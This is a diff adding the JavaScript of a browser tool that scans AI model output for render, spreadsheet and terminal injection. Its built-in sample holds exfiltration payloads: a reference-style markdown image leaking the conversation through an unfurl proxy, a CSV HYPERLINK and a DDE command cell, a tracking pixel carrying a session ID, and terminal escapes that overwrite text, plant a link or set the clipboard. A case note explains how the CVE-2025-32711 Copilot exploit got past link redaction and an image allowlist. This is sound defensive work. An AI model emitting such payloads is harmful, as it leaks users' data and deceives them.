+    if ("ABCDEFGHf".indexOf(fin) >= 0) { moves.push({ seq: m[0], line: lineOf(m.index) }); }
+    else if (fin === "J" || fin === "K") { erases.push({ seq: m[0], line: lineOf(m.index) }); }
+  }
+  for (var ci = 0; ci < s.length; ci++) {
+    if (s.charAt(ci) === "\r" && s.charAt(ci + 1) !== "\n") { counts.cr++; }
+    if (s.charAt(ci) === "\b") { counts.bs++; }
+  }
+
+  var overwriteCount = moves.length + erases.length + counts.cr + counts.bs;
+  var recon = renderTerminalApprox(s);
+  var visible = recon.text;
+  var literal = stripAllEscapes(s);
+  /* If the reconstruction hit its own size cap, the two sides are not
+     comparable and the tool says so rather than reporting a difference it
+     cannot stand behind. */
+  var comparable = !recon.capped;
+  var differs = comparable &&
+    (normalizeBlock(visible) !== normalizeBlock(expandTabs(literal).replace(/\r/g, "")));
+
+  if (overwriteCount > 0) {
+    var seqNames = [];
+    if (moves.length) { seqNames.push(moves.length + " cursor movement sequence" + (moves.length === 1 ? "" : "s") + " (CUU, CUD, CUF, CUB, CNL, CPL, CHA or CUP)"); }
+    if (erases.length) { seqNames.push(erases.length + " erase sequence" + (erases.length === 1 ? "" : "s") + " (EL or ED)"); }
+    if (counts.cr) { seqNames.push(counts.cr + " bare carriage return" + (counts.cr === 1 ? "" : "s")); }
+    if (counts.bs) { seqNames.push(counts.bs + " backspace" + (counts.bs === 1 ? "" : "s")); }
+    findings.push({
+      sink: "terminal",
+      severity: differs ? "high" : "medium",
+      title: differs
+        ? "Output rewrites itself: what is displayed is not what was sent"
+        : "Output can move the cursor and erase what it already printed",
+      element: "CSI", attribute: "cursor and erase", url: "", line: moves.length ? moves[0].line : 1,
+      snippet: "",
+      cls: { reasons: [], verdict: "terminal", verdictLabel: "", network: false, payloadBytes: 0 },
+      reasons: [
+        "Found " + seqNames.join(", ") + ".",
+        "XTerm documents CSI Ps A as Cursor Up, CSI Ps F as Cursor Preceding Line, CSI Ps K as Erase in Line and CSI Ps J as Erase in Display. Agent output holding those can overwrite a line a human already read and approved.",
+        !comparable
+          ? ("The reconstruction below was capped at " + recon.maxRows + " rows by " + recon.maxCols +
+             " columns, so it is not compared against the raw text. Read the two panels side by side instead.")
+          : (differs
+            ? "Reconstruction below: the visible result differs from the raw text with escapes removed."
+            : "Reconstruction below matched the escape-stripped text, so nothing was hidden in this particular sample.")
+      ],
+      terminalCompare: { visible: visible, literal: literal, capped: !comparable }
+    });
+  }
+
+  return {
+    sink: "terminal",
+    findings: sortFindings(findings),
+    counts: countSeverities(findings),
+    stats: counts,
+    visible: visible,
+    literal: literal,
+    differs: differs,
+    reconstructionCapped: !comparable
+  };
+}
+
+/* ---------- orchestration -------------------------------------------------- */
+
+var SEVERITY_RANK = mapFrom([
+  ["critical", 0], ["high", 1], ["medium", 2], ["low", 3], ["info", 4]
+]);
+
+function sortFindings(list) {
+  return list.slice().sort(function (a, b) {
+    var ra = mapGet(SEVERITY_RANK, a.severity, 9);
+    var rb = mapGet(SEVERITY_RANK, b.severity, 9);
+    if (ra !== rb) { return ra - rb; }
+    return (a.line || 0) - (b.line || 0);
+  });
+}
+
+function countSeverities(list) {
+  var c = { critical: 0, high: 0, medium: 0, low: 0, info: 0, total: 0 };
+  for (var i = 0; i < list.length; i++) {
+    var s = list[i].severity;
+    if (Object.prototype.hasOwnProperty.call(c, s)) { c[s]++; }
+    c.total++;
+  }
+  return c;
+}
+
+function parseAllowlist(text) {
+  var out = [];
+  var lines = String(text == null ? "" : text).split(/[\r\n,]+/);
+  for (var i = 0; i < lines.length; i++) {
+    var v = lines[i].trim().toLowerCase();
+    if (v === "") { continue; }
+    v = v.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+    if (v) { out.push(v); }
+  }
+  return out;
+}
+
+/**
+ * scanOutput: the single entry point. Give it the model response and a config,
+ * get back one plain result object. No DOM, no network, no side effects.
+ */
+function scanOutput(text, config) {
+  var cfg = config || {};
+  var source = String(text == null ? "" : text);
+  var allowlist = Array.isArray(cfg.allowlist) ? cfg.allowlist : parseAllowlist(cfg.allowlist);
+  var result = {
+    version: TOOL_VERSION,
+    inputLength: source.length,
+    sinks: makeMap(),
+    order: [],
+    totals: { critical: 0, high: 0, medium: 0, low: 0, info: 0, total: 0 }
+  };
+  if (source.trim() === "") { return result; }
+
+  if (cfg.render !== false) {
+    var r = analyzeRenderSink(source, { allowlist: allowlist });
+    mapSet(result.sinks, "render", r);
+    result.order.push("render");
+  }
+  if (cfg.csv !== false) {
+    var c = analyzeCsvSink(source, {});
+    mapSet(result.sinks, "csv", c);
+    result.order.push("csv");
+  }
+  if (cfg.terminal !== false) {
+    var t = analyzeTerminalSink(source, {
+      allowlist: allowlist,
+      decodeEscapes: cfg.decodeEscapes !== false
+    });
+    mapSet(result.sinks, "terminal", t);
+    result.order.push("terminal");
+  }
+
+  for (var i = 0; i < result.order.length; i++) {
+    var sk = mapGet(result.sinks, result.order[i], null);
+    if (!sk) { continue; }
+    var keys = ["critical", "high", "medium", "low", "info", "total"];
+    for (var k = 0; k < keys.length; k++) {
+      result.totals[keys[k]] += sk.counts[keys[k]] || 0;
+    }
+  }
+  return result;
+}
+
+/* ==========================================================================
+   END PURE CORE. Everything below touches the DOM.
+   ========================================================================== */
+
+(function () {
+  if (typeof document === "undefined") { return; }
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  function el(tag, cls, text) {
+    var n = document.createElement(tag);
+    if (cls) { n.className = cls; }
+    if (text !== undefined && text !== null) { n.textContent = String(text); }
+    return n;
+  }
+
+  /* ---------- theme: restored at load, not only on click ---------- */
+  var THEME_KEY = "losk.theme";
+  var themeBtn = $("themeBtn");
+
+  function readStoredTheme() {
+    try { return window.localStorage.getItem(THEME_KEY); } catch (e) { return null; }
+  }
+  function writeStoredTheme(v) {
+    try { window.localStorage.setItem(THEME_KEY, v); } catch (e) { /* private mode */ }
+  }
+  function applyTheme(theme) {
+    var t = (theme === "light") ? "light" : "dark";
+    document.documentElement.setAttribute("data-theme", t);
+    if (themeBtn) {
+      themeBtn.textContent = (t === "light") ? "Dark mode" : "Light mode";
+      themeBtn.setAttribute("aria-pressed", t === "light" ? "true" : "false");
+      themeBtn.setAttribute("aria-label", "Switch to " + (t === "light" ? "dark" : "light") + " mode");
+    }
+    return t;
+  }
+  /* dark is the default; a stored choice wins */
+  var currentTheme = applyTheme(readStoredTheme() || "dark");
+  if (themeBtn) {
+    themeBtn.addEventListener("click", function () {
+      currentTheme = applyTheme(currentTheme === "light" ? "dark" : "light");
+      writeStoredTheme(currentTheme);
+    });
+  }
+
+  /* ---------- sample ---------- */
+  function buildSample() {
+    var filler = [
+      "Quarter over quarter the EMEA number is flat within noise, so I have not called it out.",
+      "APAC is the only region where the variance is outside the usual band.",
+      "The LATAM figure includes the two reclassified accounts from the prior period.",
+      "Headcount is unchanged in every region.",
+      "Nothing in this report depends on the still-generating chart above.",
+      "Currency effects are excluded throughout.",
+      "The pipeline snapshot was taken at the start of the period.",
+      "Renewal timing explains most of the APAC swing.",
+      "No adjustments were made for the shortened month.",
+      "Support ticket volume tracked revenue closely in every region.",
+      "Two enterprise accounts moved from monthly to annual billing.",
+      "The forecast model was not retrained for this period.",
+      "Discount depth was flat.",
+      "Churn was concentrated in the smallest tier.",
+      "The partner channel contributed less than one percent.",
+      "Marketing spend is reported separately.",
+      "There were no pricing changes in the period.",
+      "The data cut-off matches the previous report.",
+      "One duplicate record was removed before aggregation.",
+      "Regional definitions are unchanged.",
+      "The chart reference at the top of this message is defined at the bottom.",
+      "That is deliberate, and it is the point of this sample.",
+      "A filter that reads one line at a time will not connect them.",
+      "Neither will a regular expression anchored to the line containing the image.",
+      "The destination lives forty-odd lines below the thing that uses it.",
+      "Everything between here and there is ordinary report text.",
+      "Which is exactly what makes the gap survive review.",
+      "Nothing else in this paragraph matters.",
+      "It is filler, and it is honest about being filler.",
+      "Real exfiltration mail looks like this too.",
+      "Plausible, boring, and long enough that nobody scrolls."
+    ].join("\n");
+
+    return [
+      "Here is the regional summary you asked for.",
+      "",
+      "The chart is still rendering:",
+      "",
+      "![Loading chart][chart-img]",
+      "",
+      "Paste this block straight into the sheet:",
+      "",
+      "Region,Revenue,Note",
+      "EMEA,120400,steady",
+      "APAC,98130,=HYPERLINK(\"https://collect.example.net/x?d=\"&A2,\"details\")",
+      "LATAM,44120,-2+3+cmd|'/c calc'!A1",
+      "",
+      "For reference, the snippet below is inside a fence and is not a finding:",
+      "",
+      "```html",
+      "<img src=\"https://example.com/not-a-finding.png\">",
+      "![also not a finding](https://example.com/nope.png)",
+      "```",
+      "",
+      "Current status indicator:",
+      "",
+      "<div style=\"background:url('https://pixel.example.org/p.gif?s=SESSION_ID')\">status</div>",
+      "",
+      "Deploy log tail:",
+      "",
+      "\\x1b[32mAll checks passed\\x1b[0m",
+      "$ deploy --target prod\\r$ deploy --target staging",
+      "\\x1b[1A\\x1b[2KRolled back cleanly.",
+      "\\x1b]8;;https://payments.example.net/confirm?to=attacker\\x1b\\\\Open the invoice\\x1b]8;;\\x1b\\\\",
+      "\\x1b]52;c;cGFzdGUtbWU=\\x1b\\\\",
+      "",
+      filler,
+      "",
+      "[chart-img]: https://unfurl.example.com/fetch?url=https%3A%2F%2Fdrop.example.net%2Fc%3Fq%3D<CONVERSATION>"
+    ].join("\n");
+  }
+  var SAMPLE_ALLOWLIST = "example.com\nunfurl.example.com\n*.example.org";
+
+  /* ---------- rendering ---------- */
+  var SINK_META = mapFrom([
+    ["render", {
+      title: "Render sink: HTML and markdown",
+      lead: "What your renderer fetches, and what it fetches without anybody clicking."
+    }],
+    ["csv", {
+      title: "CSV and spreadsheet sink",
+      lead: "Cells that a spreadsheet will treat as the start of a formula."
+    }],
+    ["terminal", {
+      title: "Terminal sink",
+      lead: "Sequences that change your clipboard, your window title, or what you believe you read."
+    }]
+  ]);
+
+  function copyButton(getText, label) {
+    var b = el("button", "small", label || "Copy");
+    b.type = "button";
+    b.addEventListener("click", function () {
+      var text = getText();
+      var done = function (ok) {
+        var old = b.textContent;
+        b.textContent = ok ? "Copied" : "Copy failed";
+        b.disabled = true;
+        window.setTimeout(function () { b.textContent = old; b.disabled = false; }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(fallbackCopy(text)); });
+      } else {
+        done(fallbackCopy(text));
+      }
+    });
+    return b;
+  }
+
+  function fallbackCopy(text) {
+    try {
+      var ta = document.createElement("textarea");
+      ta.value = text;
+      ta.setAttribute("readonly", "readonly");
+      ta.style.position = "fixed";
+      ta.style.top = "-1000px";
+      document.body.appendChild(ta);
+      ta.select();
+      var ok = document.execCommand("copy");
+      document.body.removeChild(ta);
+      return !!ok;
+    } catch (e) { return false; }
+  }
+
+  function verdictClass(v) {
+    if (v === "forwarder") { return "v-fwd"; }
+    if (v === "allowlisted") { return "v-allow"; }
+    if (v === "off-allowlist") { return "v-off"; }
+    return "v-rel";
+  }
+
+  function renderFinding(f) {
+    var box = el("div", "finding sev-" + f.severity);
+    var head = el("div", "f-head");
+    head.appendChild(el("span", "sev", f.severity));
+    head.appendChild(el("span", "f-title", f.title));
+    var where = [];
+    if (f.line) { where.push("line " + f.line); }
+    if (f.col) { where.push("field " + f.col); }
+    if (f.element) { where.push(f.element + (f.attribute ? " " + f.attribute : "")); }
+    if (where.length) { head.appendChild(el("span", "f-where", where.join("  |  "))); }
+    box.appendChild(head);
+
+    if (f.url) {
+      /* URLs are placed as text, never as markup and never as a style value */
+      var u = el("code", "f-url");
+      u.textContent = f.url;
+      box.appendChild(u);
+    }
+    if (f.snippet) {
+      var sn = el("code", "f-url");
+      sn.textContent = f.snippet;
+      box.appendChild(sn);
+    }
+    if (f.cls && f.cls.verdictLabel) {
+      box.appendChild(el("span", "verdict " + verdictClass(f.cls.verdict), f.cls.verdictLabel));
+    }
+    if (f.cls && f.cls.nested) {
+      var nb = el("div");
+      nb.style.marginTop = "6px";
+      nb.appendChild(el("span", "f-where", "carries this URL inside it:"));
+      var nu = el("code", "f-url");
+      nu.textContent = f.cls.nested;
+      nb.appendChild(nu);
+      box.appendChild(nb);
+    }
+    if (f.reasons && f.reasons.length) {
+      var ul = el("ul", "f-reasons");
+      for (var i = 0; i < f.reasons.length; i++) { ul.appendChild(el("li", null, f.reasons[i])); }
+      box.appendChild(ul);
+    }
+    if (f.terminalCompare) {
+      var cmp = el("div", "cmp");
+      var a = el("div");
+      a.appendChild(el("h4", null, "Raw text, escapes removed"));
+      var pa = el("pre", "term");
+      pa.textContent = f.terminalCompare.literal || "(empty)";
+      a.appendChild(pa);
+      var b2 = el("div");
+      b2.appendChild(el("h4", null, "What a terminal would show (approximate)"));
+      var pb = el("pre", "term");
+      pb.textContent = f.terminalCompare.visible || "(empty)";
+      b2.appendChild(pb);
+      cmp.appendChild(a);
+      cmp.appendChild(b2);
+      box.appendChild(cmp);
+    }
+    return box;
+  }
+
+  function statTile(n, label, cls) {
+    var d = el("div", "stat" + (cls ? " " + cls : ""));
+    d.appendChild(el("b", null, String(n)));
+    d.appendChild(el("span", null, label));
+    return d;
+  }
+
+  function renderCaseReceipt() {
+    var d = el("details");
+    d.appendChild(el("summary", null, "Case receipt for this sink: CVE-2025-32711"));
+
+    var p1 = el("p");
+    p1.style.fontSize = "0.92rem";
+    p1.textContent = "The authoritative CVE record, published 2025-06-11, describes CVE-2025-32711 as \"Ai command injection in M365 Copilot allows an unauthorized attacker to disclose information over a network\", classifies it as CWE-74, and scores it CVSS 3.1 base 9.3, Critical.";
+    d.appendChild(p1);
+
+    var p2 = el("p");
+    p2.style.fontSize = "0.92rem";
+    p2.textContent = "Two defences that this tool checks are the two the reporting researchers walked through. Aim Labs documented that Copilot redacted external markdown links from the chat history, and that reference-style markdown links and images were not redacted. They then documented that an img-src content security policy allowlist blocked their own domain, so they used an allowlisted Microsoft first-party endpoint that performs a fetch on the caller's behalf. Their write-up gives the Teams endpoint as:";
+    d.appendChild(p2);
+
+    var c = el("code", "f-url");
+    c.textContent = "https://eu-prod.asyncgw.teams.microsoft.com/urlp/v1/url/content?url=<attacker_server>/<secret>&v=1";
+    d.appendChild(c);
+
+    var p3 = el("p");
+    p3.style.fontSize = "0.92rem";
+    p3.textContent = "That is the whole argument for this tool refusing to print a green check on an allowlisted host. The allowlist was correct and enforced. It was not a boundary, because one of the hosts on it would fetch a URL handed to it in a parameter.";
+    d.appendChild(p3);
+
+    var p4 = el("p");
+    p4.style.fontSize = "0.92rem";
+    p4.textContent = "What is deliberately not claimed here: what Microsoft's fix contained. The MSRC advisory answers the question \"why are there no links to an update\" with \"This vulnerability has already been fully mitigated by Microsoft. There is no action for users of this service to take. The purpose of this CVE is to provide further transparency.\" No patch contents were published, so the only defensible statement is which defences failed, not which defence replaced them.";
+    d.appendChild(p4);
+
+    var p5 = el("p", "hint");
+    p5.textContent = "This receipt belongs to the render sink alone. The CSV and terminal sinks below cite their own sources and inherit nothing from this one.";
+    d.appendChild(p5);
+    return d;
+  }
+
+  function renderSourceNote(kind) {
+    var d = el("details");
+    if (kind === "csv") {
+      d.appendChild(el("summary", null, "Source for this sink"));
+      var p = el("p");
+      p.style.fontSize = "0.92rem";
+      p.textContent = "OWASP's CSV Injection page states the remediation as ensuring that no cell begins with equals, plus, minus, at, tab (0x09), carriage return (0x0D) or line feed (0x0A). All seven are checked, not just equals. The same page also lists the full-width variants of the four formula characters, which some locales interpret as formulas, so those four are checked as well, for eleven in total. This sink carries no CVE claim and no relationship to the render sink's case receipt.";
+      d.appendChild(p);
+    } else {
+      d.appendChild(el("summary", null, "Sources for this sink"));
+      var p2 = el("p");
+      p2.style.fontSize = "0.92rem";
+      p2.textContent = "XTerm Control Sequences documents CSI Ps A as Cursor Up, CSI Ps F as Cursor Preceding Line, CSI Ps K as Erase in Line, CSI Ps J as Erase in Display, OSC 0 as Change Icon Name and Window Title, OSC 2 as Change Window Title, and OSC 52 as Manipulate Selection Data whose base64 payload becomes the new selection available for pasting by other applications. iTerm2 documents the OSC 8 hyperlink syntax as OSC 8 ; params ; url ST, closed with OSC 8 ; ; ST, where params is zero or more colon-delimited key=value pairs. This sink carries no CVE claim and no relationship to the render sink's case receipt.";
+      d.appendChild(p2);
+    }
+    return d;
+  }
+
+  function renderSinkPanel(key, data, crossCheck) {
+    var meta = mapGet(SINK_META, key, { title: key, lead: "" });
+    var panel = el("div", "panel livebox");
+
+    var h = el("h3", null, meta.title);
+    h.style.marginTop = "0";
+    panel.appendChild(h);
+
+    var badgeRow = el("div");
+    badgeRow.style.marginBottom = "8px";
+    badgeRow.appendChild(el("span", "badge live", "Computed from your input"));
+    panel.appendChild(badgeRow);
+
+    panel.appendChild(el("p", "hint", meta.lead));
+
+    var row = el("div", "summary-row");
+    row.appendChild(statTile(data.counts.critical, "critical", "crit"));
+    row.appendChild(statTile(data.counts.high, "high", "high"));
+    row.appendChild(statTile(data.counts.medium, "medium"));
+    row.appendChild(statTile(data.counts.low + data.counts.info, "low + info"));
+    if (key === "render") {
+      var autos = 0;
+      for (var i = 0; i < data.findings.length; i++) { if (data.findings[i].auto) { autos++; } }
+      row.appendChild(statTile(autos, "fire with no click"));
+    }
+    panel.appendChild(row);
+
+    if (key === "render") {
+      var st = el("p", "hint");
+      st.textContent =
+        "Neutralized " + data.stats.neutralizedRewrites + " resource-bearing name" +
+        (data.stats.neutralizedRewrites === 1 ? "" : "s") + " before parsing. Parsed " +
+        data.stats.elementsParsed + " element" + (data.stats.elementsParsed === 1 ? "" : "s") +
+        ". Collected " + data.stats.linkDefinitions + " link reference definition" +
+        (data.stats.linkDefinitions === 1 ? "" : "s") + " from the whole document. Masked " +
+        data.stats.maskedRegions + " code or comment region" + (data.stats.maskedRegions === 1 ? "" : "s") +
+        " so their contents cannot become findings." +
+        (crossCheck ? " " + crossCheck : "");
+      panel.appendChild(st);
+    }
+
+    if (data.findings.length === 0) {
+      var okBox = el("div", "empty");
+      okBox.appendChild(el("b", null, "Nothing found for this sink"));
+      okBox.appendChild(document.createTextNode(
+        "That means none of the patterns this tool checks are present. It is not a proof of safety, and it does not cover sinks you did not declare."
+      ));
+      panel.appendChild(okBox);
+    } else {
+      for (var f = 0; f < data.findings.length; f++) {
+        panel.appendChild(renderFinding(data.findings[f]));
+      }
+    }
+
+    panel.appendChild(key === "render" ? renderCaseReceipt() : renderSourceNote(key));
+    return panel;
+  }
+
+  /* neutralize-then-parse cross-check using the browser's own parser */
+  function parserCrossCheck(neutralized) {
+    if (typeof DOMParser === "undefined") { return ""; }
+    try {
+      var doc = new DOMParser().parseFromString(neutralized, "text/html");
+      var all = doc.querySelectorAll("*");
+      var live = doc.querySelectorAll("[src], [srcset], [href], [poster], [background], [data], [style]");
+      var n = all.length;
+      var leaked = live.length;
+      /* This count is the browser parser's own, including the html, head and
+         body it synthesises, so it is deliberately not described as the same
+         number the pure tokenizer reports above. */
+      return "Cross-checked against the browser's own HTML parser on the neutralized string: " +
+        n + " node" + (n === 1 ? "" : "s") + " in the document it built, " + leaked +
+        " carrying a live resource attribute (expected 0).";
+    } catch (e) {
+      return "";
+    }
+  }
+
+  /* ---------- wiring ---------- */
+  var srcEl = $("src");
+  var allowEl = $("allow");
+  var resultsEl = $("results");
+  var errSlot = $("errSlot");
+  var statusEl = $("scanStatus");
+  var charCountEl = $("charCount");
+  var MAX_INPUT = 400000;
+
+  function updateCount() {
+    var n = srcEl.value.length;
+    charCountEl.textContent = n.toLocaleString("en-US") + " character" + (n === 1 ? "" : "s") +
+      (n > MAX_INPUT ? " (over the " + MAX_INPUT.toLocaleString("en-US") + " limit)" : "");
+  }
+
+  function showError(msg) {
+    errSlot.textContent = "";
+    var b = el("div", "errbox");
+    b.appendChild(el("strong", null, "Could not finish the scan. "));
+    b.appendChild(document.createTextNode(msg));
+    errSlot.appendChild(b);
+  }
+
+  function toPlainReport(result) {
+    var lines = [];
+    lines.push("LLM Output Sink Scanner report");
+    lines.push("Input length: " + result.inputLength + " characters");
+    lines.push("Totals: " + result.totals.critical + " critical, " + result.totals.high + " high, " +
+      result.totals.medium + " medium, " + result.totals.low + " low, " + result.totals.info + " info");
+    lines.push("");
+    for (var i = 0; i < result.order.length; i++) {
+      var key = result.order[i];
+      var data = mapGet(result.sinks, key, null);
+      if (!data) { continue; }
+      lines.push("== " + mapGet(SINK_META, key, { title: key }).title + " ==");
+      if (!data.findings.length) { lines.push("  (nothing found)"); }
+      for (var f = 0; f < data.findings.length; f++) {
+        var x = data.findings[f];
+        lines.push("  [" + x.severity.toUpperCase() + "] " + x.title +
+          (x.line ? " (line " + x.line + ")" : ""));
+        if (x.url) { lines.push("    url: " + x.url); }
+        if (x.cls && x.cls.verdictLabel) { lines.push("    verdict: " + x.cls.verdictLabel); }
+        for (var r = 0; r < x.reasons.length; r++) { lines.push("    - " + x.reasons[r]); }
+      }
+      lines.push("");
+    }
+    return lines.join("\n");
+  }
+
+  var lastResult = null;
+
+  function run() {
+    errSlot.textContent = "";
+    var text = srcEl.value;
+    if (text.length > MAX_INPUT) {
+      showError("The response is " + text.length.toLocaleString("en-US") +
+        " characters, above the " + MAX_INPUT.toLocaleString("en-US") +
+        " character limit this page will process. Trim it and scan again.");
+      return;
+    }
+    if (text.trim() === "") {
+      resultsEl.textContent = "";
+      var em = el("div", "empty");
+      em.appendChild(el("b", null, "No response loaded yet"));
+      em.appendChild(document.createTextNode("Paste a model response above, or press Load sample."));
+      resultsEl.appendChild(em);
+      statusEl.textContent = "";
+      return;
+    }
+
+    var t0 = (window.performance && window.performance.now) ? window.performance.now() : 0;
+    var result;
+    try {
+      result = scanOutput(text, {
+        allowlist: parseAllowlist(allowEl.value),
+        render: $("sinkRender").checked,
+        csv: $("sinkCsv").checked,
+        terminal: $("sinkTerm").checked,
+        decodeEscapes: $("decodeEsc").checked
+      });
+    } catch (e) {
+      showError("Unexpected input shape: " + (e && e.message ? e.message : String(e)) +
+        ". The scan was abandoned and nothing was requested.");
+      return;
+    }
+    lastResult = result;
+
+    var t1 = (window.performance && window.performance.now) ? window.performance.now() : 0;
+    var ms = t1 - t0;
+    var msText = Number.isFinite(ms) && ms > 0 ? (" in " + (ms < 1 ? "under 1" : Math.round(ms)) + " ms") : "";
+
+    resultsEl.textContent = "";
+
+    if (result.order.length === 0) {
+      var none = el("div", "empty");
+      none.appendChild(el("b", null, "No sinks declared"));
+      none.appendChild(document.createTextNode("Tick at least one sink above so the scanner knows what your app does with this text."));
+      resultsEl.appendChild(none);
+      statusEl.textContent = "";
+      return;
+    }
+
+    var top = el("div", "panel tight");
+    var trow = el("div", "summary-row");
+    trow.appendChild(statTile(result.totals.critical, "critical", "crit"));
+    trow.appendChild(statTile(result.totals.high, "high", "high"));
+    trow.appendChild(statTile(result.totals.medium, "medium"));
+    trow.appendChild(statTile(result.totals.low + result.totals.info, "low + info"));
+    trow.appendChild(statTile(result.order.length, "sinks scanned"));
+    top.appendChild(trow);
+    var btns = el("div", "btnrow");
+    btns.appendChild(copyButton(function () { return toPlainReport(lastResult); }, "Copy report"));
+    btns.appendChild(copyButton(function () {
+      var urls = [];
+      for (var i = 0; i < lastResult.order.length; i++) {
+        var d = mapGet(lastResult.sinks, lastResult.order[i], null);
+        if (!d) { continue; }
+        for (var f = 0; f < d.findings.length; f++) { if (d.findings[f].url) { urls.push(d.findings[f].url); } }
+      }
+      return urls.join("\n");
+    }, "Copy found URLs"));
+    var note = el("span", "hint", "Nothing was requested. Every URL above is text.");
+    btns.appendChild(note);
+    top.appendChild(btns);
+    resultsEl.appendChild(top);
+
+    for (var i = 0; i < result.order.length; i++) {
+      var key = result.order[i];
+      var data = mapGet(result.sinks, key, null);
+      if (!data) { continue; }
+      var cc = (key === "render") ? parserCrossCheck(data.neutralized) : "";
+      resultsEl.appendChild(renderSinkPanel(key, data, cc));
+    }
+
+    statusEl.textContent = "Scanned " + result.inputLength.toLocaleString("en-US") +
+      " characters" + msText + ". " + result.totals.total + " finding" +
+      (result.totals.total === 1 ? "" : "s") + ". Zero requests made.";
+  }
+
+  var debounceTimer = null;
+  function scheduleRun() {
+    if (debounceTimer) { window.clearTimeout(debounceTimer); }
+    debounceTimer = window.setTimeout(run, 260);
+  }
+
+  $("scanBtn").addEventListener("click", run);
+  $("sampleBtn").addEventListener("click", function () {
+    srcEl.value = buildSample();
+    allowEl.value = SAMPLE_ALLOWLIST;
+    updateCount();
+    run();
+    resultsEl.scrollIntoView({ behavior: "smooth", block: "start" });
+  });
+  $("clearBtn").addEventListener("click", function () {
+    srcEl.value = "";
+    updateCount();
+    run();
+    srcEl.focus();
+  });
+  srcEl.addEventListener("input", function () { updateCount(); scheduleRun(); });
+  allowEl.addEventListener("input", scheduleRun);
+  var toggles = ["sinkRender", "sinkCsv", "sinkTerm", "decodeEsc"];
+  for (var ti = 0; ti < toggles.length; ti++) {
+    $(toggles[ti]).addEventListener("change", run);
+  }
+
+  updateCount();
+})();
+</script>
+
+</body>
+</html>
